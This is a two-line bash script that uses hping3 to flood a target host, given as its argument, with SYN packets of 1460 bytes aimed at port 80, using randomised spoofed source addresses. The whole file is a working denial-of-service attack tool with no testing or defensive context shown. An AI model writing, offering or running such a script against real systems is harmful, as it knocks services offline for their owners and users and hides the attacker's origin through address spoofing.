#!/bin/bash
hping3 --flood -d 1460 -S -p 80 --rand-source "$1"
